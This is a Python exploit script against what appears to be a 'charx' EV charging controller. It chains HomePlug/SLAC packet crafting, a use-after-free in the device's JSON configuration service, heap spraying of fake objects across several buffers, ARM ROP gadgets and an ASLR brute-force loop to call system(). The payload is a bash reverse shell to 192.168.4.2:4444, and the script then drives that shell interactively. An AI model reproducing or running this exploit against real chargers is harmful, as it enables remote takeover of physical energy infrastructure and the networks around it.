import struct, time, argparse, socket, sys, json, threading, traceback

parser = argparse.ArgumentParser()
parser.add_argument("iface", help="interface connected to charx eth1")
args = parser.parse_args()

from scapy.arch import get_if_hwaddr, get_if_addr
from scapy.layers.l2 import getmacbyip, Ether
from scapy.sendrecv import sendp, sniff
from scapy.packet import Raw

def p8(x):
    return struct.pack("<B", x)
def p16(x):
    return struct.pack("<H", x)
def p32(x):
    return struct.pack("<I", x)
def p64(x):
    return struct.pack("<Q", x)
def u16(s):
    return struct.unpack("<H", s)[0]

def info(s):
    print("[\x1b[34;1m*\x1b[0m] "+s)
def warn(s):
    print("[\x1b[33;1m!\x1b[0m] "+s)

class HomePlug:
    def __init__(self, iface):
        self.iface = iface
        self.mac = get_if_hwaddr(self.iface)
        print("using %s for interface %s"%(self.mac, self.iface))
        self.dstmac = getmacbyip("192.168.4.1")
        print("using %s for charx"%self.dstmac)
        if self.dstmac is None:
            raise Exception("failed to get charx mac, run with sudo?")
        ip = get_if_addr(self.iface)
        if ip != "192.168.4.2":
            raise Exception("interface %s should have static ip 192.168.4.2, is: %s"%(self.iface, ip))
        self.eth = Ether(dst=self.dstmac, src=self.mac, type=0x88e1)
        self.sendsleep = .05
    def pmac(self, s):
        return bytes.fromhex(s.replace(':',''))
    def hdr(self, mmtype):
        pl = p8(1) # version, not used
        pl += p16(mmtype)
        pl += p16(0) # fragmentation, not used
        return pl
    def create_pkt(self, mmtype, pl):
        return self.eth / Raw(load=self.hdr(mmtype)+pl)
    def send_raw(self, pkt):
        sendp(pkt, iface=self.iface)
    def send_pl(self, mmtype, pl):
        self.send_raw(self.create_pkt(mmtype, pl))
    def wait_for_init(self):
        res = sniff(iface=self.iface, count=1, lfilter=lambda p: p.type==0x88e1, timeout=3)
        if len(res) == 0:
            raise Exception("timeout waiting for init")
    def send_with_resp(self, mmtype, pl, resp_mmtype):
        # send packet and wait to receive response with given mmtype
        # this seems like a hacky use of sniff but whatever
        isresp = lambda p: p.type==0x88e1 and p.haslayer(Raw) and len(p.load)>=3 and u16(p.load[1:3])==resp_mmtype
        res = sniff(iface=self.iface, count=1, lfilter=isresp, started_callback=lambda: self.send_pl(mmtype, pl), timeout=3)
        if len(res) == 0:
            raise Exception("timeout waiting for resp 0x%x"%resp_mmtype)
    def send_slac_parm_req(self, runid):
        # CM_SLAC_PARM.REQ
        self.runid = runid
        pl = p8(0) # APPLICATION_TYPE
        pl += p8(0) # SECURITY_TYPE
        pl += p64(runid)
        pl += p8(0) # ? not used, but length is checked
        self.send_with_resp(0x6064, pl, 0x6065)
    def send_start_atten_char_ind(self):
        # CM_START_ATTEN_CHAR.IND
        pl = p8(0) # APPLICATION_TYPE
        pl += p8(0) # SECURITY_TYPE
        pl += p8(1) # NUM_SOUNDS
        pl += p8(10) # Time_Out
        pl += p8(0) # RESP_TYPE
        pl += b"\0"*6 # FORWARDING_STA
        pl += p64(self.runid)
        self.send_pl(0x606a, pl)
        time.sleep(self.sendsleep)
    def send_mnbc_sound_ind(self):
        # CM_MNBC_SOUND.IND
        pl = p8(0) # APPLICATION_TYPE
        pl += p8(0) # SECURITY_TYPE
        pl += b"\0"*17 # SenderID
        pl += p8(0) # SoundsCnt
        pl += p64(self.runid)
        pl += b"\0"*8 # reserved
        pl += b"\0"*16 # SoundsRnd
        self.send_pl(0x6076, pl)
        time.sleep(self.sendsleep)
    def send_atten_profile_ind(self):
        # CM_ATTEN_PROFILE.IND
        pl = self.pmac(self.mac) # PEV_MAC
        pl += p8(0) # NumGroups
        pl += p8(0) # reserved
        self.send_pl(0x6086, pl)
        time.sleep(self.sendsleep)
    def send_atten_char_rsp(self):
        # CM_ATTEN_CHAR.RSP
        pl = p8(0) # APPLICATION_TYPE
        pl += p8(0) # SECURITY_TYPE
        pl += self.pmac(self.mac) # SOURCE_ADDRESS
        pl += p64(self.runid)
        pl += b"\0"*17 # SOURCE_ID
        pl += b"\0"*17 # RESP_ID
        pl += p8(0) # Result
        self.send_pl(0x606f, pl)
        time.sleep(self.sendsleep)
    def send_slac_match_req(self):
        # CM_SLAC_MATCH.REQ
        pl = p8(0) # APPLICATION_TYPE
        pl += p8(0) # SECURITY_TYPE
        pl += p16(0x3e) # MVFLength
        pl += b"\0"*17 # PEV_ID
        pl += self.pmac(self.mac) # PEV_MAC
        pl += b"\0"*17 # EVSE_ID
        pl += self.pmac(self.dstmac) # EVSE_MAC
        pl += p64(self.runid)
        pl += b"\0"*8 # reserved
        self.send_with_resp(0x607c, pl, 0x607d)
    def build_amp_map_req(self, amlen):
        # CM_AMP_MAP.REQ
        pl = p16(amlen)
        # unneeded since bug
        #pl += b"\0"*((amlen+1)>>1)
        return bytes(self.create_pkt(0x601c, pl))

class Socket:
    def close(self):
        self.sock.close()
    def recv(self, n):
        return self.sock.recv(n)
    def recvuntil(self, delim):
        data = b""
        while not data.endswith(delim):
            data += self.recv(1)
        return data
    def recvline(self):
        return self.recvuntil(b'\n')
    def send(self, data):
        self.sock.send(data)
    def sendline(self, data):
        self.send(data+b'\n')
    def interactive(self):
        info("entering interactive")
        try:
            import termios
            oldatt = termios.tcgetattr(sys.stdin.buffer.fileno())
            att = termios.tcgetattr(sys.stdin.buffer.fileno())
            att[3] &= ~(termios.ICANON | termios.ECHO)
            termios.tcsetattr(sys.stdin.buffer.fileno(), termios.TCSANOW, att)
        except:
            pass
        stop = threading.Event()
        def rcvthread():
            self.sock.settimeout(.05)
            while not stop.is_set():
                try:
                    sys.stdout.buffer.write(self.recv(1))
                    sys.stdout.buffer.flush()
                except socket.timeout:
                    pass
                except:
                    warn("got EOF remote")
                    break
        rthread = threading.Thread(target=rcvthread, daemon=True)
        rthread.start()
        while True:
            try:
                self.send(sys.stdin.buffer.read(1))
            except KeyboardInterrupt:
                print("Interrupted")
                stop.set()
                rthread.join()
                break
        try:
            termios.tcsetattr(sys.stdin.buffer.fileno(), termios.TCSANOW, oldatt)
        except:
            pass
class Remote(Socket):
    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
        self.sock.settimeout(15)
class Listen(Socket):
    def __init__(self, port):
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.serv.bind(("192.168.4.2", port))
        self.serv.listen(1)
        self.serv.setblocking(False)
    def accept(self):
        try:
            self.sock, _ = self.serv.accept()
            return True
        except BlockingIOError:
            return False

def setup_null_deref():
    print("waiting for charx to send packet")
    homeplug.wait_for_init()
    print("sending / waiting for slac_parm.cnf")
    homeplug.send_slac_parm_req(0x1122334455667788)
    print("received slac_parm.cnf")
    homeplug.send_start_atten_char_ind()
    homeplug.send_mnbc_sound_ind()
    homeplug.send_atten_profile_ind()
    homeplug.send_atten_char_rsp()
    print("sending / waiting for slac_match.cnf")
    homeplug.send_slac_match_req()
    print("received slac_match.cnf")

def set_cfg(*args):
    msg = {}
    msg["operationName"] = "configAccess"
    msg["deviceUid"] = "root"
    msg["operationId"] = 0
    params = []
    for a in args:
        params.append({"name":a[0], "value":a[1]})
    msg["operationParameters"] = {"accessType":"write", "configurationParams":params}
    msg = json.dumps(msg, ensure_ascii=False).encode("latin1")
    remote.sendline(msg)
    print(remote.recvline().strip())
def get_cfg(*args):
    msg = {}
    msg["operationName"] = "configAccess"
    msg["deviceUid"] = "root"
    msg["operationId"] = 0
    params = []
    for a in args:
        params.append({"name":a})
    msg["operationParameters"] = {"accessType":"read", "configurationParams":params}
    msg = json.dumps(msg, ensure_ascii=False).encode("latin1")
    remote.sendline(msg)
    resp = remote.recvline()
    print(resp.strip())
    resp = json.loads(resp)
    res = resp["operationResult"]["configurationParams"]
    return list(res[a]["value"] for a in args)
def start_homeplug_msg():
    msg = {}
    msg["operationName"] = "v2gMessage"
    msg["deviceUid"] = ""
    msg["operationId"] = 1
    msg["operationParameters"] = {"methodName":"subscribe", "subscriptionId":1}
    return json.dumps(msg).encode("latin1")
def start_homeplug():
    remote.sendline(start_homeplug_msg())
    print(remote.recvline().strip())

def create_tube(timeout=15):
    end = time.time()+timeout
    while time.time() < end:
        check_shell()
        try:
            r = Remote("192.168.4.1", 4444)
            check_shell()
            return r
        except ConnectionRefusedError:
            pass
    raise Exception("timed out trying to connect")

homeplug = HomePlug(args.iface)

def exploit():
    global remote, remote2
    # need to have first ClientSession not have connection assigned
    # this will force going to next node, which is freed config string
    # so we connect two clients then will close the first later
    # this will likely fail the first attempt since a client is normally already connected
    # on retries, winning the race of connecting first should be very easy
    remote2 = create_tube()
    remote = create_tube()

    # wait for CAN device, needed to start homeplug
    set_cfg(("SeccNetworkInterfaceName", "eth1"))
    print("waiting for CAN device")
    waitstart = time.time()
    while True:
        remote.sendline(b'{"operationName":"childDeviceList","deviceUid":"root","operationId":1}')
        resp = json.loads(remote.recvline())
        uids = list(resp['operationResult']['childDeviceList'].keys())
        if len(uids) > 0:
            candev_uid = uids[0]
            if len(uids) != 1:
                warn("got more than 1 child device")
                print(json.dumps(resp['operationResult']['childDeviceList'], indent=2))
            break
        if time.time()-waitstart > 15:
            raise Exception("timeout waiting for CAN device")
    info("waiting for info for deviceUid %s"%candev_uid)
    waitstart = time.time()
    while True:
        remote.sendline(b'{"operationName":"deviceInfo","deviceUid":"%s","operationId":1}'%candev_uid.encode("latin1"))
        resp = json.loads(remote.recvline())
        if resp['operationResult']['operationStatus'] == "success":
            print("device up")
            break
        if time.time()-waitstart > 15:
            raise Exception("timeout waiting for device to start")

    # to maximixe ASLR brute force probability,
    # place payload in several pages of v2g_msg
    # start with tariff description as first fake obj
    v2g_msg = 0x509fd0
    v2g_msg_tariff_desc = v2g_msg+0x147d4
    pgoff = v2g_msg_tariff_desc&0xfff
    fakeobj = v2g_msg_tariff_desc+0x79000

    # set config string to alloc chunk of size 0x68 (same size as UAF'd ClientSession list node)
    # further std::string assigns of shorter strings will reuse the same chunk
    # abuse that to embed nulls
    assert b'\0' not in p32(fakeobj)[:-1]
    set_cfg(
        ("SeccTlsKeyFile", "A"*0x60),
        ("SeccTlsKeyFile", "B"*0x10+p32(fakeobj)[:-1].decode("latin1")),
    )

    '''
    given r4 control invoke arb func with arb arg
    0x458d12:    ldrh    r1, [r4, #8]
    0x458d14:    ldr     r3, [r4, #4]
    0x458d16:    ldr     r4, [sp, #0]
    0x458d18:    cbnz    r1, 0x458d24
    0x458d1a:    b.n     0x458d06
    0x458d1c:    subs    r1, #1
    0x458d1e:    add.w   r3, r3, #16
    0x458d22:    beq.n   0x458d06
    0x458d24:    ldrd    r2, r0, [r3]
    0x458d28:    eors    r2, r4
    0x458d2a:    tst     r2, r0
    0x458d2c:    bne.n   0x458d1c
    0x458d2e:    ldr     r2, [r3, #12]
    0x458d30:    cmp     r2, #0
    0x458d32:    beq.n   0x458d06
    0x458d34:    ldr     r0, [r3, #8]
    0x458d36:    mov     r1, r6
    0x458d38:    blx     r2
    '''
    gadget = 0x458d12
    system = 0x415b70 # plt entry

    '''
    with r0 fakeobj set r4 to r0
    0x498148:    mov     r4, r0
    0x49814a:    ldr     r7, [r0, #0]
    0x49814c:    mov     r5, r1
    0x49814e:    mov     r6, r2
    0x498150:    mov     r1, r3
    0x498152:    ldr     r2, [sp, #24]
    0x498154:    ldr     r3, [r7, #20]
    0x498156:    blx     r3
    '''
    set_r4 = 0x498148

    '''
    deref r4 for new fakeobj
    0x4a32ea:    ldr     r0, [r4, #0]
    0x4a32ec:    ldr     r3, [r0, #0]
    0x4a32ee:    ldr     r3, [r3, #8]
    0x4a32f0:    blx     r3
    '''
    deref_r4 = 0x4a32ea

    # each fakeobj needs to have different text pointers
    global nfake2
    nfake2 = 0
    def construct_fake2(unslid_fakeobj, string=False):
        global cur_fake2, cur_fake2_buf, cur_fake2_left, tcpmsg, discov_msg, hpgp_msg, nfake2
        def concatpl(pl):
            global cur_fake2, cur_fake2_left, tcpmsg, discov_msg, hpgp_msg
            if cur_fake2_buf == "HP":
                hpgp_msg += pl
                assert len(hpgp_msg) < 0x5ea
            elif cur_fake2_buf == "UDP":
                discov_msg += pl
                assert len(discov_msg) < 0x400
            else:
                tcpmsg += pl
                assert b'\n' not in pl
                assert len(tcpmsg) < 0x4000
            cur_fake2 += len(pl)
            cur_fake2_left -= len(pl)

        # figure out if theres enough space in current buffer
        # also adjust to avoid bad bytes (null or newline)
        # buffer order: UDP, HP, TCP
        slide = fakeobj-unslid_fakeobj
        while True:
            # adjust if string
            nextra = 0
            if string:
                while True:
                    s = p32(cur_fake2+slide+nextra)[:-1]
                    if b'\0' in s or b'\n' in s:
                        nextra += 4
                    else:
                        break
            # TCP buf cant have newlines, and nulls cost an iteration
            if cur_fake2_buf == "TCP":
                while True:
                    s = p32(cur_fake2+slide+nextra+0xc-8)+p32(cur_fake2+slide+nextra+0x18)
                    if b'\n' in s or s.count(b'\0') > 2:
                        nextra += 4
                    else:
                        break
            if cur_fake2_left < 4*10 + nextra:
                if cur_fake2_buf == "UDP":
                    cur_fake2_buf = "HP"
                    cur_fake2_left = 0x5ea-len(hpgp_msg)
                    cur_fake2 = hpgp_rawbuf+len(hpgp_msg)
                elif cur_fake2_buf == "HP":
                    cur_fake2_buf = "TCP"
                    cur_fake2_left = 0x3fff-tcppad
                    cur_fake2 = tcpbuf_string+len(tcpmsg)
                else:
                    raise Exception("ran out of fakeobj space")
            else:
                if nextra:
                    concatpl(b"A"*nextra)
                break

        fake2 = cur_fake2 + slide
        nfake2 += 1
        #info("fakeobj @ 0x%x 0x%x (0x%x) +0x%x %d"%(unslid_fakeobj, fake2, fake2-slide, slide, nfake2))
        pl = p32(fake2+0xc-8) # vtable for fakeobj2, will call +8
        pl += p32(fake2+0x18) # entries for arb call gadget
        pl += p32(set_r4+1 + slide) # initial gadget to set r4 to r0
        pl += p32(set_r4+1 + slide) # fakeobj2 vtable func, set r4 again
        pl += b"A"*4
        pl += p32(deref_r4+1 + slide) # second gadget to invoke on fakeobj2
        pl += p32(gadget+1 + slide) # fakeobj2 2nd vtable func, arb call gadget
        # start entries
        # first 2 fields: ([0] ^ 0x42) & [1] == 0
        # [0] is actually prev field (gadget)
        # done this way for less nulls (in case of tcp buf)
        # 0x42 comes from m_isConnectionAssigned of freed config str
        pl += p32(~(0x42 ^ (gadget+1+slide))&0xffffffff) # bitwise and to give 0
        pl += p32(cmdaddr + slide) # arg
        pl += p32(system + slide) # func
        concatpl(pl)
        return fake2

    def populate_v2g():
        global nfake2
        msg = {}
        msg["operationName"] = "v2gMessage"
        msg["deviceUid"] = "root"
        msg["operationId"] = 1

        schedTuples = []

        # sales tariff 0
        # non-array entry description for first page
        # page offset will be 0x7a4
        desc0 = b"AA"+p32(construct_fake2(v2g_msg+0x147d4))[:-1]
        assert b'\0' not in desc0
        assert b'\n' not in desc0
        desc0 = desc0.decode("latin1")

        # salesTariffEntries
        # full 1024 array starts at +0x147f4 in v2g_msg
        # each of 1024 entries is 0x1b4 in size
        # 0x6038 between each 1024 array
        def make_tariffs(startaddr):
            tariff_ents = []
            tariff_ent_off = 0
            tariff_fake_off = (pgoff - startaddr)&0xfff
            json_nop = {"":0}
            while tariff_fake_off < 0x1b4*1024:
                off = tariff_fake_off - tariff_ent_off
                while off >= 0x1b4:
                    tariff_ents.append(json_nop)
                    tariff_ent_off += 0x1b4
                    off = tariff_fake_off - tariff_ent_off
                tariff_fake2 = startaddr+tariff_fake_off
                ent = json_nop

                if off == 4:
                    # start
                    ent = {"relativeTimeInterval":{"start":construct_fake2(tariff_fake2)}}
                elif off == 0xc:
                    # duration
                    ent = {"relativeTimeInterval":{"duration":construct_fake2(tariff_fake2)}}
                elif off >= 0x10:
                    # part of array of 3 ConsumptionCostList each size 0x8c
                    consumlist_off = off-0x10
                    consumlist_idx = consumlist_off//0x8c
                    consumlistent_off = consumlist_off%0x8c
                    if consumlistent_off == 4:
                        # startValue
                        arr = []
                        for i in range(consumlist_idx):
                            arr.append(json_nop)
                        arr.append({"startValue":construct_fake2(tariff_fake2)})
                        ent = {"consumptionCost":arr}
                    elif consumlistent_off >= 8:
                        # part of array of 3 ConsumptionCost each size 0x2c
                        costslist_off = consumlistent_off-8
                        costslist_idx = costslist_off//0x2c
                        costslistent_off = costslist_off%0x2c
                        arr = []
                        for i in range(consumlist_idx):
                            arr.append(json_nop)
                        costs = []
                        for i in range(costslist_idx):
                            costs.append(json_nop)
                        if costslistent_off == 4:
                            # amount
                            costs.append({"amount":construct_fake2(tariff_fake2)})
                            arr.append({"cost":costs})
                            ent = {"consumptionCost":arr}
                        elif costslistent_off >= 0xa:
                            # possibly part of costKind char array size 32 (31 + null)
                            costkind_off = costslistent_off-0xa
                            if costkind_off+3 < 32:
                                ckaddr = construct_fake2(tariff_fake2, string=True)
                                ckind = b"A"*costkind_off + p32(ckaddr)[:-1]
                                assert b'\0' not in ckind
                                assert b'\n' not in ckind
                                costs.append({"costKind":ckind.decode("latin1")})
                                arr.append({"cost":costs})
                                ent = {"consumptionCost":arr}

                tariff_ents.append(ent)
                tariff_ent_off += 0x1b4
                tariff_fake_off += 0x1000
                # avoid json blob exceeding size limit of 0x4000
                if nfake2 >= 83:
                    break
            return tariff_ents

        tariff0_startaddr = v2g_msg+0x147f4
        tariff_ents0 = make_tariffs(tariff0_startaddr)
        tariff0 = {"description":desc0, "salesTariffEntries":tariff_ents0}
        tariff_ents1 = make_tariffs(tariff0_startaddr+0x1b4*1024+0x6038)
        tariff1 = {"salesTariffEntries":tariff_ents1}

        tup0 = {"salesTariff":tariff0}
        tup1 = {"salesTariff":tariff1}
        schedTuples.append(tup0)
        schedTuples.append(tup1)
        params = {"saScheduleList":{"saScheduleTuples":schedTuples}}
        msg["operationParameters"] = {"methodName":"response", "v2gMessageParams":params}
        msg = json.dumps(msg, ensure_ascii=False).encode("latin1")
        assert len(msg) < 0x4000
        remote.sendline(msg)
        ln = remote.recvline().strip()
        print(ln)
        if b"qcaLinkStatus" in ln:
            print(remote.recvline().strip())

    # use 3 buffers for fake objects
    # udp discovery buf, homeplug raw packet buf, tcp string buf
    # tcp string buf is large but slow for embedding nulls
    global tcpmsg, hpgp_msg, discov_msg, cur_fake2_left, cur_fake2_buf, cur_fake2
    tcpbuf_string = 0x5049d0 # 0x4000 bytes
    discov_buf = 0x69feb0 # 0x400 bytes
    hpgp_rawbuf = 0x6718f8 # 0x5ea bytes
    tcppad = 0x1000 # just to prevent other stuff from overwriting it
    hpgp_msg = homeplug.build_amp_map_req(0x100)
    cmdaddr = hpgp_rawbuf+len(hpgp_msg)
    hpgp_msg += b"date>/tmp/pwned;bash -i >&/dev/tcp/192.168.4.2/4444 0>&1&\0"
    while len(hpgp_msg)%4 != 0:
        hpgp_msg += b'\0'
    tcpmsg = b"A"*tcppad
    discov_msg = b""
    # UDP first, then HP then TCP
    cur_fake2_buf = "UDP"
    cur_fake2_left = 0x400-len(discov_msg)
    cur_fake2 = discov_buf+len(discov_msg)

    # populate_v2g must be after start homeplug to not memset v2g_msg
    # populate_v2g fills the 0x4000 tcpbuf_string, so fill tcpbuf_string after
    start_homeplug()
    populate_v2g()

    # populate raw buffer fake objects
    # populate UDP buf
    send_discovery(discov_msg)
    # populate tcpbuf_string
    # use multiple strncpy to embed nulls
    totpl = tcpmsg
    print("populating tcpbuf")
    ii = 0
    while len(totpl) > 0:
        # sometimes agent will get SIGTERM during this send loop
        # presumably it is too busy handling messages and misses a heartbeat or something
        # sleep probably isnt necessary but should give less weirdness, only costs ~.5s
        ii += 1
        if ii % 10 == 0:
            time.sleep(.03)
        remote.sendline(totpl.replace(b'\0',b'C')+b'\0')
        ln = remote.recvline().strip()
        if ln != b'{"error":"contentNotParsable"}':
            warn("unexpected response: %s"%ln)
        if b'\0' not in totpl:
            totpl = b""
        else:
            totpl = totpl[:totpl.rindex(b'\0')]
    setup_null_deref()
    # close to unassign first ClientSession list node
    remote2.close()
    # triggers crash and populates raw packet buf
    homeplug.send_raw(hpgp_msg)

    # wait short period to ensure it processes the msg and crashes
    # for some reason the charx can take a while to close the tcp connection
    # (longer than it takes for the service to restart)
    # so waiting just a short time decreases avg attempt duration
    # also seems to lessen the chance the service doesnt restart
    flushstart = time.time()
    remote.sock.setblocking(False)
    while time.time()-flushstart < 1:
        check_shell()
        try:
            if len(remote.recv(0x1000)) == 0:
                break
        except BlockingIOError:
            pass
    remote.close()

def timestr(x):
    return "%dm%.3fs"%(int(x/60), x-int(x/60)*60)

listen = Listen(4444)
def check_shell():
    if listen.accept():
        warn("!!! got shell, took %s %d attempts"%(timestr(time.time()-gstart), attempt))
        listen.interactive()
        exit()

# setup broadcast udp socket (autodiscovery)
def send_discovery(pl):
    udp_discover.sendto(pl, ("192.168.4.255", 4444))
udp_discover = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
udp_discover.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
udp_discover.bind(("192.168.4.2", 0))

gstart = time.time()
attempt = 1
attempt_times = 0
while True:
    info("attempt %d"%attempt)
    start = time.time()
    try:
        exploit()
    except (SystemExit, KeyboardInterrupt):
        traceback.print_exc()
        exit()
    except:
        traceback.print_exc()
        try:
            remote.close()
        except:
            pass
        try:
            remote2.close()
        except:
            pass
    duration = time.time()-start
    attempt_times += duration
    info("took %.3f s, avg %.3f s, total %s"%(duration, attempt_times/attempt, timestr(time.time()-gstart)))
    attempt += 1
